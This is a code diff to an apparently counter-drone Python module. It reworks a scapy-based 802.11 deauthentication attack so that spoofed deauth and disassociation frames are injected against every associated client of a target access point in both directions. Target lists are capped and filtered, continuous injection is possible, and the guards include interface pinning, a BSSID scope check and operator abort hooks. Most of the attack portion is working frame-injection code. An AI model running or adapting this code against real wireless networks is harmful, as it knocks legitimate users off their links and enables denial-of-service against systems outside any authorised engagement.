@@ -96,6 +96,16 @@ ARSDK_DEFAULT_C2D_PORT = 54321
 _BROADCAST_MAC_HEX = "ffffffffffff"
 _MAC_RE = re.compile(r"^([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}$")
 
+# R2 — CAP: maximum associated-client STA targets a single send_deauth call will
+# transmit against. An oversized STA list (e.g. a mis-surveyed / spoofed AP
+# reporting hundreds of "clients") is truncated to this many (stable order,
+# never re-sorted) rather than refused outright — the surviving targets are
+# still real, unicast, de-duped STAs. A truncation logs a WARNING so it is
+# never silent. Mirrors the defense-in-depth cap enforced again at the API
+# layer (backend/server.py WifiDefeatBody.client_macs / WifiDroneIngestBody.
+# associated_client_macs).
+MAX_DEAUTH_STA_TARGETS = 64
+
 
 def _pinned_wifi_tx_iface() -> Optional[str]:
     """Live-read WIFI_TX_IFACE, treating a missing OR whitespace-only value as
@@ -203,24 +213,35 @@ def _bssid_scope_error(target_bssid: Optional[str]) -> Optional[str]:
 # import scapy / open a socket ONLY when actually called, so importing this
 # module (and the unit tests, which inject fakes) never needs a radio.
 
-def _tx_deauth_frames(iface: str, target_bssid: str, client_mac: str,
+def _tx_deauth_frames(iface: str, target_bssid: str, client_macs: Any,
                       channel: Optional[int]) -> None:
-    """Build and inject ONE deauth+disassoc burst spoofed as target_bssid on
-    `iface`. This is the single well-isolated real-TX call for the 802.11 path;
-    the injection loop in send_deauth polls the abort predicate BEFORE every
-    call to this function. scapy is imported lazily so the module imports without
-    it; a real deployment could alternatively drive an aireplay-ng subprocess
-    here (in which case the loop's abort must terminate that process)."""
+    """Build and inject ONE deauth+disassoc burst PER associated client STA,
+    BIDIRECTIONALLY, spoofed on `iface`. This is the single well-isolated real-TX
+    call for the 802.11 path; the injection loop in send_deauth polls the abort
+    predicate BEFORE every call to this function.
+
+    For EACH STA in `client_macs` two directions are transmitted, because a
+    client that ignores a frame purporting to come from itself may still act on
+    one addressed from the AP (and vice-versa):
+      * AP -> STA : addr1=STA,   addr2=BSSID, addr3=BSSID
+      * STA -> AP : addr1=BSSID, addr2=STA,   addr3=BSSID
+    reason 7 (class-3 frame received from a nonassociated STA). addr2/addr3 ALWAYS
+    pin the ONE target softAP BSSID (never the band). There is NO broadcast frame:
+    send_deauth has already refused an empty STA list, so `client_macs` here is a
+    concrete, non-broadcast unicast list. scapy is imported lazily so the module
+    imports without it; a real deployment could alternatively drive an aireplay-ng
+    subprocess here (in which case the loop's abort must terminate that process)."""
     from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp  # lazy
 
-    # Spoof the softAP BSSID as both the transmitter (addr2) and the BSS (addr3);
-    # deauth the specific client (addr1) — client_mac broadcast (FF:FF:FF:FF:FF:FF)
-    # here targets all clients OF THIS ONE BSSID only (that is the drone's own
-    # controller), which is NOT the band-wide broadcast the BSSID guard forbids.
-    dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
-    deauth = RadioTap() / dot11 / Dot11Deauth(reason=7)
-    disas = RadioTap() / dot11 / Dot11Disas(reason=7)
-    sendp([deauth, disas], iface=iface, verbose=False)
+    frames = []
+    for sta in client_macs:
+        ap_to_sta = Dot11(addr1=sta, addr2=target_bssid, addr3=target_bssid)
+        sta_to_ap = Dot11(addr1=target_bssid, addr2=sta, addr3=target_bssid)
+        frames.append(RadioTap() / ap_to_sta / Dot11Deauth(reason=7))
+        frames.append(RadioTap() / ap_to_sta / Dot11Disas(reason=7))
+        frames.append(RadioTap() / sta_to_ap / Dot11Deauth(reason=7))
+        frames.append(RadioTap() / sta_to_ap / Dot11Disas(reason=7))
+    sendp(frames, iface=iface, verbose=False)
 
 
 def _udp_send(target: Tuple[str, int], payload: bytes) -> None:
@@ -271,12 +292,12 @@ def _resolve_softap(softap: Any, default_port: int) -> Tuple[Optional[Tuple[str,
 def send_deauth(
     iface: str,
     target_bssid: str,
-    client_mac: Optional[str],
+    client_macs: Any,
     channel: Optional[int],
     count: Optional[int],
     stop_event: Optional["Any"] = None,
     tx_halt_check: Optional[Callable[[], bool]] = None,
-    frame_sender: Optional[Callable[[str, str, str, Optional[int]], None]] = None,
+    frame_sender: Optional[Callable[[str, str, Any, Optional[int]], None]] = None,
 ) -> Dict[str, Any]:
     """Inject 802.11 deauth/disassoc management frames spoofed as target_bssid so
     the drone's controller link drops (LINK-DROP failsafe, NOT takeover).
@@ -288,6 +309,22 @@ def send_deauth(
          pinned WIFI_TX_IFACE — no transmitting on the wrong NIC.
       2. FRATRICIDE: _bssid_scope_error() — refuse broadcast / empty / None /
          malformed target_bssid; a specific unicast softAP BSSID is mandatory.
+      3. NO-STA HONESTY: refuse when the resolved STA list is EMPTY. FORENSICS: a
+         broadcast-addressed deauth (addr1 = FF:FF:FF:FF:FF:FF) transmits fine but
+         is IGNORED by modern (PMF-capable) clients, so a deauth with no concrete
+         associated-client STA to aim at would be on-air noise with no effect.
+         There is NO broadcast-client fallback — enumerate the STAs first.
+
+    client_macs: the associated-client STA MACs to deauth off this BSSID, per-STA
+    by UNICAST (a list; a single MAC string is also accepted for back-compat). The
+    list is normalized: malformed MACs dropped, ANY group/multicast MAC dropped
+    (I/G bit set — broadcast included but not the only case), surviving MACs
+    canonicalized to colon-separated UPPER form, de-duped (stable order), then
+    capped at MAX_DEAUTH_STA_TARGETS (surplus truncated with a WARNING, not
+    refused). If nothing survives, the transmit is REFUSED (guard 3) — it is
+    NEVER replaced with the FF:FF:FF:FF:FF:FF broadcast client. The bidirectional
+    frames for each STA still pin addr2/addr3 to the ONE target BSSID (never the
+    band).
 
     count: number of deauth bursts to inject. None / <= 0 means CONTINUOUS —
     inject until the operator stops it (stop_event / tx_halt_check). Either way
@@ -295,16 +332,10 @@ def send_deauth(
     and stops immediately when it fires (prompt abort), so a global EMERGENCY
     ABORT or an expired range-auth lease ends the effect within one iteration.
 
-    client_mac: the client to deauth off this BSSID; defaults to this BSSID's
-    broadcast client (FF:FF:FF:FF:FF:FF) — that is band-safe because addr2/addr3
-    still pin the ONE softAP BSSID (it deauths only that softAP's own clients),
-    which is why it is NOT rejected by the fratricide guard (that guard is about
-    the target BSSID, addr2/addr3).
-
     frame_sender: injectable one-burst TX hook for tests (default = the real
-    scapy _tx_deauth_frames). Receives (iface, target_bssid, client_mac, channel)
-    so a test can assert the correct BSSID / channel were transmitted, without a
-    real NIC.
+    scapy _tx_deauth_frames). Receives (iface, target_bssid, client_macs, channel)
+    — client_macs is the resolved unicast STA LIST — so a test can assert the
+    correct BSSID / STAs / channel were transmitted, without a real NIC.
 
     Returns {"ok", "error", "stopped_early", "frames_sent"}."""
     pin_err = _wifi_tx_pinning_error(iface)
@@ -314,7 +345,50 @@ def send_deauth(
     if scope_err:
         return {"ok": False, "error": scope_err, "stopped_early": False, "frames_sent": 0}
 
-    client = client_mac if (isinstance(client_mac, str) and client_mac.strip()) else "FF:FF:FF:FF:FF:FF"
+    # Resolve the STA target list. Accept a list/tuple, or a single MAC string
+    # (back-compat). Normalize (validate + upper-case), DROP any malformed MAC and
+    # any broadcast MAC (no broadcast path anywhere), de-dup preserving order.
+    if isinstance(client_macs, str):
+        raw = [client_macs]
+    elif isinstance(client_macs, (list, tuple)):
+        raw = list(client_macs)
+    else:
+        raw = []
+    targets = []
+    seen = set()
+    for m in raw:
+        if not isinstance(m, str):
+            continue
+        norm = _normalize_mac(m)
+        if norm is None or norm == _BROADCAST_MAC_HEX:
+            continue  # malformed or broadcast STA -> never transmitted
+        # R1 — GROUP/MULTICAST guard: a real associated client STA is always a
+        # UNICAST address. Drop any MAC whose first octet has the I/G
+        # (least-significant) bit set — this covers broadcast (already dropped
+        # above) AND every other multicast/group address (e.g. 01:00:5E:...).
+        if int(norm[0:2], 16) & 0x01:
+            continue  # group/multicast STA -> never transmitted
+        if norm in seen:
+            continue
+        seen.add(norm)
+        # R3 — CANONICALIZE: forward in canonical colon-separated UPPER form
+        # (derived from the normalized hex, not the caller's raw string) so a
+        # valid dash-form / mixed-case MAC isn't rejected by scapy at TX.
+        targets.append(":".join(norm[i:i + 2] for i in range(0, 12, 2)).upper())
+
+    if len(targets) > MAX_DEAUTH_STA_TARGETS:
+        print(f"WARNING: send_deauth STA target list ({len(targets)}) exceeds "
+              f"MAX_DEAUTH_STA_TARGETS ({MAX_DEAUTH_STA_TARGETS}) — truncating "
+              f"to the first {MAX_DEAUTH_STA_TARGETS} (stable order).",
+              file=sys.stderr)
+        targets = targets[:MAX_DEAUTH_STA_TARGETS]
+
+    if not targets:
+        return {"ok": False,
+                "error": ("no associated clients to target (enumerate STAs first; "
+                          "broadcast deauth is not permitted)"),
+                "stopped_early": False, "frames_sent": 0}
+
     sender = frame_sender or _tx_deauth_frames
     continuous = count is None or count <= 0
     remaining = None if continuous else int(count)
@@ -328,7 +402,7 @@ def send_deauth(
         if remaining is not None and remaining <= 0:
             break
         try:
-            sender(iface, target_bssid, client, channel)
+            sender(iface, target_bssid, targets, channel)
         except Exception as e:  # never crash the bridge on a TX-side failure
             return {"ok": False, "error": f"deauth inject failed: {e}",
                     "stopped_early": False, "frames_sent": frames_sent}
